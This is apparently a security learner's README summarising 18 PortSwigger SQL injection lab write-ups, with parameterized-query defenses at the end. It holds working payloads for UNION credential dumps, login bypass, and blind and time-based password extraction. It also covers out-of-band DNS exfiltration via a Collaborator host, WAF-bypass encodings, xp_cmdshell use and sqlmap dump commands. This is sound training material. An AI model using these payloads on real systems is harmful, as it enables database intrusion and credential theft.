# 💉 SQL Injection Vulnerabilities — Complete Lab Series

<div align="center">

![SQL Injection](https://img.shields.io/badge/Category-SQL%20Injection-FF4500?style=for-the-badge&logo=databricks&logoColor=white)
![Labs Completed](https://img.shields.io/badge/Labs%20Completed-18%2F18-00C853?style=for-the-badge&logo=checkmarx&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice%20to%20Expert-9C27B0?style=for-the-badge&logo=target&logoColor=white)
![Status](https://img.shields.io/badge/Status-100%25%20Complete-00BCD4?style=for-the-badge&logo=statuspage&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-PortSwigger%20Academy-FF6D00?style=for-the-badge&logo=hackaday&logoColor=white)

<br>

```
 ____   ___  _
/ ___| / _ \| |
\___ \| | | | |
 ___) | |_| | |___
|____/ \__\_\_____|

 ___ _   _     _ _____ ____ _____ ___ ___  _   _
|_ _| \ | |   | | ____/ ___|_   _|_ _/ _ \| \ | |
 | ||  \| |_  | |  _|| |     | |  | | | | |  \| |
 | || |\  | |_| | |__| |___  | |  | | |_| | |\  |
|___|_| \_|\___/|_____\____| |_| |___\___/|_| \_|
```

**18 Labs · 3 Difficulty Tiers · 60+ Hours of Hands-On Database Exploitation**

[🔗 Main Repository](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) • [👤 About Me](https://github.com/Gurpreet-Singh-offensive-Security) • [📧 Contact](mailto:gskhalsa6245@gmail.com) • [🔐 Auth Labs](./AUTHENTICATION/)

</div>

---

## 📊 Achievement Dashboard

<div align="center">

```
╔══════════════════════════════════════════════════════════════════╗
║                    🏆  SQL INJECTION MASTERY                     ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  Overall Progress  ████████████████████████████████  100%        ║
║                                                                  ║
║  🟢 Apprentice     ██████████████████████████████     9 / 9      ║
║  🟡 Practitioner   ████████████████████████           8 / 8      ║
║  🔴 Expert         ████████                           1 / 1      ║
║                                                                  ║
║  ⏱️  Time Invested  60+ Hours                                    ║
║  🛠️  Tools Used     Burp Suite Pro · SQLMap · Python             ║
║  🗄️  DBs Covered    MySQL · PostgreSQL · Oracle · MSSQL          ║
║  📋  Docs           Professional Walkthroughs + CVSS             ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
```

</div>

---

## 📖 What is SQL Injection?

SQL Injection (SQLi) is one of the **most dangerous and prevalent** web application vulnerabilities, consistently ranked in the **OWASP Top 10**. It occurs when user-controlled input is embedded into SQL queries without proper sanitization, allowing attackers to manipulate the database engine itself.

> 📌 *"SQL Injection has been responsible for some of the largest data breaches in history — including the 2012 LinkedIn breach (117M records), the 2008 Heartland Payment Systems breach (134M cards), and countless others."*

### ⚠️ Real-World Business Impact

| Impact Category | Consequence | CVSS Score |
|----------------|-------------|------------|
| 🚨 **Database Dump** | Full extraction of all sensitive data | `10.0 Critical` |
| 🔑 **Authentication Bypass** | Admin access without credentials | `9.8 Critical` |
| 🗑️ **Data Destruction** | DROP/TRUNCATE table — irreversible data loss | `9.1 Critical` |
| 🖥️ **OS Command Execution** | RCE via `xp_cmdshell` or `INTO OUTFILE` | `10.0 Critical` |
| 🔒 **Privilege Escalation** | Database admin → OS root | `9.8 Critical` |
| 👁️ **Blind Data Exfiltration** | Silent exfil via boolean/timing channels | `8.5 High` |
| 💰 **Financial Fraud** | Manipulate transactions & pricing logic | `9.0 Critical` |

### 📈 Industry Statistics

```
💸  Average breach cost involving SQLi:   $4.45M    (IBM 2023)
📊  Web attacks using SQLi:               65%+      (Verizon DBIR)
🕐  Average time to detect:              277 days   (IBM Security)
🏦  Records exposed in top SQLi breaches: 1 Billion+
⚖️  GDPR fines possible:                 €20M or 4% annual revenue
```

---

## 📂 Complete Lab Series — All 18 Labs

### 🟢 Apprentice Tier — Foundation & Core Techniques
> *Build a rock-solid understanding of SQL Injection fundamentals*

| # | Lab Title | Key Technique | Attack Type |
|---|-----------|---------------|-------------|
| 1 | [SQL Injection WHERE Clause — Retrieve Hidden Data](./LAB-1-SQL-Injection.md) | Category filter parameter is injectable — appended `' OR 1=1--` turns `WHERE category='Gifts'` into always-true condition — all hidden rows including unreleased products returned — confirmed by increased product count in response | `In-Band · UNION` |
| 2 | [SQL Injection — Login Bypass](./LAB-2-SQL-Injection.md) | Username field injectable — entered `administrator'--` which closes the string and comments out the entire `AND password='...'` clause — server authenticates based on username match alone — full admin session granted without knowing password | `Auth Bypass` |
| 3 | [SQL Injection UNION — Determine Column Count](./LAB-3-SQL-Injection.md) | Injected `ORDER BY 1--` then incremented to `ORDER BY 2--` then `ORDER BY 3--` — error thrown at 3 confirms 2 columns exist — cross-verified with `UNION SELECT NULL,NULL--` returning no error — column count established before data extraction | `UNION Based` |
| 4 | [SQL Injection UNION — Find Columns with Text](./LAB-4-SQL-Injection.md) | Column count already known as 2 — tested `UNION SELECT 'test',NULL--` then `UNION SELECT NULL,'test'--` — second payload returned `'test'` string in response — confirmed column 2 accepts string data type — required before injecting real payload | `UNION Based` |
| 5 | [SQL Injection UNION — Retrieve Data from Other Tables](./LAB-5-SQL-Injection.md) | Column count 2 confirmed, both string-compatible — injected `UNION SELECT username,password FROM users--` — full users table dumped directly into product listing response — administrator credentials visible in plaintext — account compromised | `UNION Based` |
| 6 | [SQL Injection UNION — Retrieve Multiple Values in Single Column](./LAB-6-SQL-Injection.md) | Only one string-compatible column available — used Oracle/PostgreSQL concatenation `UNION SELECT NULL,username\|\|'~'\|\|password FROM users--` — tilde delimiter separates username and password within single column — all credentials extracted in one request | `UNION Based` |
| 7 | [SQL Injection — Query the Database Type and Version (Oracle)](./LAB-7-SQL-Injection.md) | Oracle requires `FROM` clause in every `SELECT` — used `FROM dual` dummy table — injected `UNION SELECT BANNER,NULL FROM v$version--` — Oracle version banner string returned in response — DB type and exact version fingerprinted for targeted follow-up attacks | `Fingerprinting` |
| 8 | [SQL Injection — Query the Database Type and Version (MySQL/MSSQL)](./LAB-8-SQL-Injection.md) | MySQL requires `#` comment style or space after `--` — injected `UNION SELECT @@version,NULL#` — global system variable `@@version` returned full MySQL/MSSQL version string — confirmed DB engine and version to tailor syntax for subsequent exploitation | `Fingerprinting` |
| 9 | [SQL Injection — List the Database Contents (non-Oracle)](./LAB-9-SQL-Injection.md) | Queried `information_schema.tables` to list all table names — identified users table name — queried `information_schema.columns WHERE table_name='users_abcxyz'` to get column names — final payload `UNION SELECT username_col,password_col FROM users_abcxyz--` dumped credentials — administrator password retrieved — account compromised | `Enumeration` |

---

### 🟡 Practitioner Tier — Advanced Exploitation Techniques
> *Master blind injection, out-of-band channels, and database-specific attacks*

| # | Lab Title | Key Technique | Attack Type |
|---|-----------|---------------|-------------|
| 10 | [SQL Injection — List the Database Contents (Oracle)](./LAB-10-SQL-Injection.md) | Oracle has no `information_schema` — used Oracle-specific catalog `SELECT table_name FROM all_tables` to enumerate tables — identified users table — queried `SELECT column_name FROM all_columns WHERE table_name='USERS_ABCXYZ'` — extracted column names — final `UNION SELECT` dumped plaintext credentials — administrator account compromised | `Enumeration` |
| 11 | [Blind SQLi — Conditional Responses](./LAB-11-SQL-Injection.md) | No data returned in response — injected into `TrackingId` cookie — `' AND 1=1--` returned "Welcome back" message — `' AND 1=2--` removed it — boolean oracle confirmed — queried `AND (SELECT 'x' FROM users WHERE username='administrator')='x'` to confirm table exists — extracted password char-by-char using `AND SUBSTRING(password,1,1)='a'` — Burp Intruder Cluster Bomb across all positions and characters — response length difference identified correct chars — full password reconstructed — account compromised | `Blind · Boolean` |
| 12 | [Blind SQLi — Conditional Errors](./LAB-12-SQL-Injection.md) | No visual page difference on true/false — injected `' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--` — division by zero on true condition forces Oracle error (500) vs normal response (200) — HTTP status code used as boolean oracle — password extracted char-by-char using `CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END` — Intruder automated all positions — error response = correct character — full password obtained | `Blind · Error` |
| 13 | [Blind SQLi — Time Delays](./LAB-13-SQL-Injection.md) | No response difference at all — injected time-based payload into cookie — `'; SELECT pg_sleep(10)--` (PostgreSQL) caused 10 second response delay confirming injection — MySQL equivalent `'; SELECT SLEEP(10)--` — MSSQL `'; WAITFOR DELAY '0:0:10'--` — Oracle `'; SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),10) FROM dual--` — delay vs instant response confirmed injectable parameter and DB type | `Blind · Time` |
| 14 | [Blind SQLi — Time Delays and Data Exfiltration](./LAB-14-SQL-Injection.md) | Time delay confirmed as oracle — extracted data char-by-char using conditional sleep — payload `'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--` — Burp Intruder with Resource Pool (1 thread) to preserve timing accuracy — 5s delay = correct character — no delay = wrong — all positions iterated — full administrator password reconstructed — account compromised | `Blind · Time` |
| 15 | [Blind SQLi — Out-of-Band Interaction](./LAB-15-SQL-Injection.md) | Application processed query async — no timing or boolean feedback — used Burp Collaborator to generate unique OOB subdomain — Oracle payload `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % r SYSTEM "http://COLLABORATOR-SUBDOMAIN/"> %r;]>'),'/l') FROM dual--` — DNS lookup received in Collaborator confirming outbound interaction — OOB channel established and verified | `Blind · OOB` |
| 16 | [Blind SQLi — Out-of-Band Data Exfiltration](./LAB-16-SQL-Injection.md) | OOB channel confirmed — embedded live query inside DNS subdomain to carry exfiltrated data — Oracle payload `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % r SYSTEM "http://'\|\|(SELECT password FROM users WHERE username='administrator')\|\|'.COLLABORATOR-SUBDOMAIN/"> %r;]>'),'/l') FROM dual--` — Collaborator received DNS lookup with administrator password as subdomain prefix — decoded from interaction log — account compromised | `Blind · OOB` |
| 17 | [SQL Injection — Filter Bypass via XML Encoding](./LAB-17-SQL-Injection.md) | WAF detected and blocked standard SQLi keywords in request body — payload delivered inside XML `<storeId>` parameter — used XML hex entity encoding to obfuscate: `S` → `&#x53;` making `&#x53;ELECT` — WAF failed to decode and match signature — backend XML parser decoded entities before passing to DB — full `UNION SELECT` executed — credentials extracted — WAF bypass successful | `WAF Bypass` |

---

### 🔴 Expert Tier — Cutting-Edge Attack Chains
> *Elite-level exploitation requiring chained techniques and deep database knowledge*

| # | Lab Title | Key Technique | Attack Type |
|---|-----------|---------------|-------------|
| 18 | [Visible Error-Based SQL Injection](./LAB-18-SQL-Injection.md) | Verbose database errors enabled — injected `' AND 1=CAST((SELECT 1) AS int)--` to confirm error-based channel — then `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` — DB attempted to cast string username as integer — error message included actual value: `invalid input syntax for type integer: "administrator"` — repeated with password column — full plaintext password leaked directly inside PostgreSQL error message — account compromised without any blind technique | `Error Based` |

---

## 🔎 Attack Techniques Deep-Dive

### ⚡ Technique 1 — UNION-Based Injection

The most straightforward SQLi class. Append a `UNION SELECT` to the original query and retrieve data from arbitrary tables.

**Step-by-step:**
```sql
-- Step 1: Determine number of columns
' ORDER BY 1--    → works
' ORDER BY 2--    → works
' ORDER BY 3--    → ERROR → 2 columns confirmed

-- Step 2: Find text-compatible columns
' UNION SELECT NULL,NULL--
' UNION SELECT 'test',NULL--   → 'test' appears → col 1 is string

-- Step 3: Exfiltrate data
' UNION SELECT username, password FROM users--

-- Step 4: Concatenate when only 1 text column available
' UNION SELECT NULL, username||'~'||password FROM users--
```

**Database Version Fingerprinting:**
```sql
-- Oracle (requires FROM dual)
' UNION SELECT BANNER, NULL FROM v$version--

-- MySQL / MSSQL
' UNION SELECT @@version, NULL--

-- PostgreSQL
' UNION SELECT version(), NULL--
```

---

### 🔍 Technique 2 — Boolean-Based Blind Injection

No data in response — instead, two different page states (true vs false) serve as an oracle.

```sql
-- Confirm injection point
' AND 1=1--   →  Normal page  ✅
' AND 1=2--   →  Altered/blank page ✅ (boolean confirmed)

-- Enumerate table existence
' AND (SELECT 'x' FROM users LIMIT 1)='x'--

-- Extract password character by character
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
-- Automate with Burp Intruder — 128 requests per character position
-- Filter on response length difference to find correct character
```

---

### ⏱️ Technique 3 — Time-Based Blind Injection

Zero visual difference in response — use deliberate time delays as the data oracle.

```sql
-- Confirm time-based injection
'; SELECT SLEEP(10)--                          -- MySQL
'; SELECT pg_sleep(10)--                       -- PostgreSQL
'; EXEC xp_cmdshell('ping -n 10 127.0.0.1')-- -- MSSQL
'; SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),10) FROM dual-- -- Oracle

-- Conditional time delay for data extraction
'; IF (SELECT COUNT(username) FROM users WHERE username='administrator')=1
   WAITFOR DELAY '0:0:10'--                    -- MSSQL

-- PostgreSQL char-by-char extraction
'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a')
   THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users
   WHERE username='administrator'--
```

---

### 📶 Technique 4 — Out-of-Band (OOB) Exfiltration

When there's zero response feedback — force the database to make a **DNS/HTTP request** carrying exfiltrated data as a subdomain.

```sql
-- Oracle DNS lookup (Burp Collaborator)
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM
"http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--

-- MSSQL DNS + data exfil
'; exec master..xp_dirtree
'//'+( SELECT password FROM users WHERE username='administrator' )+'.burpcollaborator.net/a'--

-- Technique: check Collaborator for incoming DNS lookup
-- Subdomain = exfiltrated value
```

---

### 🛡️ Technique 5 — WAF Bypass via Encoding

When a Web Application Firewall blocks keywords like `UNION`, `SELECT`, `FROM`:

```xml
<!-- XML Context — use hex entity encoding to obfuscate -->
<storeId>
  1 &#x55;NION &#x53;ELECT NULL--
</storeId>

<!-- URL Double Encoding -->
%2527 → decoded twice → '

<!-- Case variation (some WAFs are case-sensitive) -->
uNiOn SeLeCt

<!-- Comment insertion (MySQL) -->
UN/**/ION SEL/**/ECT

<!-- Whitespace substitution -->
UNION%09SELECT   (tab instead of space)
UNION%0ASELECT   (newline instead of space)
```

---

### ⚡ Technique 6 — Error-Based Data Extraction

Force the database to include query results **inside its own error messages**:

```sql
-- PostgreSQL: cast-to-wrong-type error leaks value
' AND CAST((SELECT password FROM users LIMIT 1) AS integer)--
-- Error: invalid input syntax for type integer: "s3cur3p4ssw0rd"
--                                                ↑ password leaked in error!

-- Oracle: XMLType error
' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT password FROM users WHERE username='administrator'))--

-- MSSQL: convert error
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
```

---

## 🗄️ Database Cheat Sheet

### Schema Enumeration Per Database

```sql
╔══════════════════╦════════════════════════════════════════════════════╗
║ Database         ║ List Tables Query                                  ║
╠══════════════════╬════════════════════════════════════════════════════╣
║ MySQL/MSSQL/PgSQL║ SELECT table_name FROM information_schema.tables   ║
║                  ║   WHERE table_schema = 'public'                    ║
╠══════════════════╬════════════════════════════════════════════════════╣
║ Oracle           ║ SELECT table_name FROM all_tables                  ║
╚══════════════════╩════════════════════════════════════════════════════╝

╔══════════════════╦════════════════════════════════════════════════════╗
║ Database         ║ List Columns Query                                 ║
╠══════════════════╬════════════════════════════════════════════════════╣
║ MySQL/MSSQL/PgSQL║ SELECT column_name FROM information_schema.columns ║
║                  ║   WHERE table_name = 'users'                       ║
╠══════════════════╬════════════════════════════════════════════════════╣
║ Oracle           ║ SELECT column_name FROM all_columns                ║
║                  ║   WHERE table_name = 'USERS'                       ║
╚══════════════════╩════════════════════════════════════════════════════╝
```

### String Concatenation Syntax

| Database | Syntax | Example |
|----------|--------|---------|
| **Oracle** | `\|\|` | `'foo'\|\|'bar'` |
| **MSSQL** | `+` | `'foo'+'bar'` |
| **PostgreSQL** | `\|\|` | `'foo'\|\|'bar'` |
| **MySQL** | `CONCAT()` | `CONCAT('foo','bar')` |

### Comment Syntax

| Database | Inline Comment | Block Comment |
|----------|----------------|---------------|
| **MySQL** | `--` or `#` | `/* ... */` |
| **MSSQL** | `--` | `/* ... */` |
| **PostgreSQL** | `--` | `/* ... */` |
| **Oracle** | `--` | `/* ... */` |

---

## 🛡️ Defense & Remediation

### ✅ Parameterized Queries (Primary Defense)

```python
# ❌ VULNERABLE — string concatenation
query = "SELECT * FROM products WHERE category = '" + category + "'"

# ✅ SECURE — parameterized query (Python)
query = "SELECT * FROM products WHERE category = %s"
cursor.execute(query, (category,))

# ✅ SECURE — prepared statement (Java)
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
stmt.setString(1, category);
```

```javascript
// ✅ SECURE — Node.js with parameterized query
const query = 'SELECT * FROM users WHERE username = $1 AND password = $2';
const result = await pool.query(query, [username, password]);
```

```csharp
// ✅ SECURE — C# with SqlCommand
SqlCommand cmd = new SqlCommand(
    "SELECT * FROM users WHERE username = @user AND password = @pass", conn);
cmd.Parameters.AddWithValue("@user", username);
cmd.Parameters.AddWithValue("@pass", password);
```

### ✅ Defense-in-Depth Layers

```
Layer 1 — Input Validation
  ├─ Allowlist expected formats (e.g. only alphanumeric for usernames)
  ├─ Reject unexpected characters (', ", --, ;, /*)
  └─ Validate data type, length, and range

Layer 2 — Parameterized Queries / ORM
  ├─ NEVER build queries via string concatenation
  ├─ Use ORM (SQLAlchemy, Hibernate, Entity Framework)
  └─ Stored procedures with typed parameters

Layer 3 — Least Privilege
  ├─ DB user should only have SELECT on needed tables
  ├─ No DBA/root DB credentials in app config
  └─ Separate read/write accounts

Layer 4 — Error Handling
  ├─ Generic error messages to users (no DB details)
  ├─ Detailed errors only in server logs
  └─ Never expose stack traces or query strings

Layer 5 — WAF & Monitoring
  ├─ ModSecurity / AWS WAF rules for SQLi patterns
  ├─ Anomaly detection on query patterns
  └─ Alert on UNION, SLEEP, INFORMATION_SCHEMA in logs
```

### Security Checklist

| Control | Status | Priority |
|---------|--------|----------|
| 🔐 Parameterized queries everywhere | Required | 🔴 Critical |
| 🗄️ Least-privilege DB accounts | Required | 🔴 Critical |
| 🚫 No raw string SQL construction | Required | 🔴 Critical |
| 🛡️ WAF with SQLi ruleset | Recommended | 🟠 High |
| 📋 Generic error messages | Required | 🟠 High |
| 🔍 DB activity monitoring | Recommended | 🟡 Medium |
| 🧪 Regular SQLi scanning (DAST) | Best practice | 🟡 Medium |

---

## 🛠️ Tools & Setup

### Required Tools

| Tool | Purpose | Link |
|------|---------|-------|
| **Burp Suite Professional** | Primary proxy, Intruder, Repeater | [portswigger.net](https://portswigger.net/burp/pro) |
| **SQLMap** | Automated SQLi detection & exploitation | [sqlmap.org](https://sqlmap.org) |
| **Burp Collaborator** | OOB interaction detection (built-in) | Burp Suite Pro |
| **Python 3.x** | Custom automation scripts | [python.org](https://python.org) |
| **Firefox + FoxyProxy** | Browser proxy routing | Browser extension |

### Environment Setup

```bash
# 1. Configure Burp Proxy
Browser → FoxyProxy → 127.0.0.1:8080
Install Burp CA cert → Firefox certificate store

# 2. SQLMap for automated exploitation
sqlmap -u "https://target.com/products?category=gifts" \
  --dbs --batch --level=5 --risk=3

# Extract specific table
sqlmap -u "https://target.com/products?category=gifts" \
  -D public -T users --dump

# 3. Burp Intruder for blind char-by-char
# Mark payload position: §a§ in SUBSTRING(password,1,1)='§a§'
# Payload: a-z, 0-9, A-Z (62 chars per position)
# Grep match: true page response signature

# 4. Collaborator for OOB
# Burp → Burp Collaborator client → Copy payload subdomain
# Embed in DNS/HTTP lookup payload → Poll for interactions
```

---

## 📐 Learning Path

### Prerequisites

Before starting this series, ensure proficiency in:

- HTTP request/response cycle (methods, headers, status codes)
- Burp Suite Proxy, Repeater, and Intruder modules
- Basic SQL syntax (`SELECT`, `WHERE`, `JOIN`, `UNION`)
- Cookie/session management concepts
- URL and HTML encoding fundamentals

### Recommended Lab Order

```
Phase 1 — UNION Mastery (Labs 1–9)  ──────────────────────────
│  Start here. Build intuition for query structure,
│  column counting, and direct data extraction.
│  Tools: Burp Repeater only.
│
Phase 2 — Blind Injection (Labs 11–16)  ───────────────────────
│  Hardest mental shift. Learn to extract data
│  without seeing it — boolean oracles and time delays.
│  Tools: Burp Intruder, Python scripts.
│
Phase 3 — Specialized (Labs 17–18)  ───────────────────────────
│  WAF evasion and error-based leakage.
│  Requires solid foundation from phases 1–2.
│  Tools: Full Burp Suite Pro suite.
│
Phase 4 — Automation & Reporting  ──────────────────────────────
   SQLMap for verification, professional writeup documentation.
   Tools: SQLMap, Python, Markdown.
```

### Skills Developed Across the Series

```
✅ UNION-based data extraction
✅ Multi-database fingerprinting (MySQL, PostgreSQL, Oracle, MSSQL)
✅ Boolean-based blind injection
✅ Time-based blind injection
✅ Out-of-band (DNS/HTTP) exfiltration
✅ WAF detection and bypass techniques
✅ Error-based data leakage
✅ Full schema enumeration (information_schema & Oracle catalogs)
✅ Burp Suite Intruder automation
✅ SQLMap usage and custom tamper scripts
✅ Professional vulnerability documentation & CVSS scoring
```

---

## 📋 Lab Completion Tracker

### 🟢 Apprentice Level — `9 / 9 Complete`

- [x] [Lab 1 · SQL Injection WHERE Clause — Retrieve Hidden Data](./LAB-1-SQL-Injection.md)
- [x] [Lab 2 · SQL Injection — Login Bypass](./LAB-2-SQL-Injection.md)
- [x] [Lab 3 · UNION — Determine Column Count](./LAB-3-SQL-Injection.md)
- [x] [Lab 4 · UNION — Find Text-Compatible Columns](./LAB-4-SQL-Injection.md)
- [x] [Lab 5 · UNION — Retrieve Data from Other Tables](./LAB-5-SQL-Injection.md)
- [x] [Lab 6 · UNION — Retrieve Multiple Values in One Column](./LAB-6-SQL-Injection.md)
- [x] [Lab 7 · Query Database Type & Version (Oracle)](./LAB-7-SQL-Injection.md)
- [x] [Lab 8 · Query Database Type & Version (MySQL/MSSQL)](./LAB-8-SQL-Injection.md)
- [x] [Lab 9 · List Database Contents (non-Oracle)](./LAB-9-SQL-Injection.md)

### 🟡 Practitioner Level — `8 / 8 Complete`

- [x] [Lab 10 · List Database Contents (Oracle)](./LAB-10-SQL-Injection.md)
- [x] [Lab 11 · Blind SQLi — Conditional Responses](./LAB-11-SQL-Injection.md)
- [x] [Lab 12 · Blind SQLi — Conditional Errors](./LAB-12-SQL-Injection.md)
- [x] [Lab 13 · Blind SQLi — Time Delays](./LAB-13-SQL-Injection.md)
- [x] [Lab 14 · Blind SQLi — Time Delays & Data Exfiltration](./LAB-14-SQL-Injection.md)
- [x] [Lab 15 · Blind SQLi — Out-of-Band Interaction](./LAB-15-SQL-Injection.md)
- [x] [Lab 16 · Blind SQLi — Out-of-Band Data Exfiltration](./LAB-16-SQL-Injection.md)
- [x] [Lab 17 · SQL Injection Filter Bypass via XML Encoding](./LAB-17-SQL-Injection.md)

### 🔴 Expert Level — `1 / 1 Complete`

- [x] [Lab 18 · Visible Error-Based SQL Injection](./LAB-18-SQL-Injection.md)

---

## 📚 Additional Resources

### Official Documentation
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [NIST NVD — CWE-89 SQLi](https://nvd.nist.gov/vuln/search/results?cwe_id=CWE-89)

### Research & Talks
- *"SQL Injection Attacks and Defense"* — Justin Clarke (Syngress)
- *"Advanced SQL Injection to Operating System Full Control"* — Bernardo Damele (Black Hat 2009)
- *"Blind SQL Injection Automation Techniques"* — PortSwigger Research

### Related Lab Series in This Repository
- [🔐 Authentication Vulnerabilities](./AUTHENTICATION/) — 14 labs complete
- [🌐 Cross-Site Scripting (XSS)](./XSS/) — Coming Soon
- [🔓 Access Control](./ACCESS-CONTROL/) — Coming Soon
- [🗂️ File Path Traversal](./PATH-TRAVERSAL/) — Coming Soon

---

## 🏆 Final Achievement Summary

<div align="center">

```
╔═════════════════════════════════════════════════════════════════╗
║                                                                 ║
║                  💉  SQL INJECTION — COMPLETE                   ║
╠═════════════════════════════════════════════════════════════════╣
║                                                                 ║
║   Labs Completed     18 / 18          ✅  100%                  ║
║   Apprentice          9 / 9            🟢  Complete             ║
║   Practitioner        8 / 8            🟡  Complete             ║
║   Expert              1 / 1            🔴  Complete             ║
║   Hours Invested      60+              ⏱️   Documented          ║
║   Databases Covered   4                🗄️   All Major DBs       ║
║                                                                 ║
╠═════════════════════════════════════════════════════════════════╣
║                                                                 ║
║  ➡️  Up Next:   Cross-Site Scripting (XSS) Lab Series            ║
║  ➡️  Then:      Access Control & IDOR                            ║
║  ➡️  Then:      Server-Side Request Forgery (SSRF)               ║
║                                                                 ║
╚═════════════════════════════════════════════════════════════════╝
```

</div>

---

## ⚖️ Legal & Ethical Disclaimer

<div align="center">

### ⚠️ AUTHORIZED USE ONLY

**All techniques, payloads, and methods documented in this repository are strictly for:**

✅ Authorized penetration testing with written permission  
✅ Educational study in controlled lab environments (PortSwigger Academy)  
✅ CTF competitions and legal bug bounty programs  
✅ Security research on systems you own  

</div>

**Unauthorized use of these techniques against any system is illegal** under:

| Jurisdiction | Law | Maximum Penalty |
|---|---|---|
| 🇺🇸 United States | Computer Fraud and Abuse Act (CFAA) | 20 years imprisonment |
| 🇬🇧 United Kingdom | Computer Misuse Act 1990 | 10 years imprisonment |
| 🇪🇺 European Union | ePrivacy Directive + GDPR | €20M or 4% of revenue |
| 🇨🇦 Canada | Criminal Code Section 342.1 | 10 years imprisonment |
| 🇦🇺 Australia | Criminal Code Act 1995 | 10 years imprisonment |

**The author assumes zero liability for misuse of this material. Always hack legally and ethically.**

---

## 🔬 Author

<div align="center">

### Created by Gurpreet Singh

**Offensive Security Researcher | Red Team Engineer in Training**

[![GitHub](https://img.shields.io/badge/GitHub-Offensive--Security--Labs-181717?style=for-the-badge&logo=github)](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0077B5?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/gurpreetsingh-security)
[![Email](https://img.shields.io/badge/Email-Contact-D14836?style=for-the-badge&logo=gmail)](mailto:gskhalsa6245@gmail.com)

---

### 📄 License

**CC BY-NC-ND 4.0** — Attribution · NonCommercial · NoDerivatives

*Copyright © 2025 Gurpreet Singh. All rights reserved.*

</div>

---

## 🎓 Acknowledgments

- **PortSwigger Web Security Academy** — World-class free security training platform
- **OWASP Foundation** — Comprehensive open security documentation
- **The InfoSec Community** — For the culture of open knowledge sharing

---

<div align="center">

**💉 Series Complete** · **🗄️ All 4 Databases Covered** · **🔴 Expert Level Achieved** · **18/18 Documented**

*Keep learning, keep hacking — legally.* 🔐

</div>
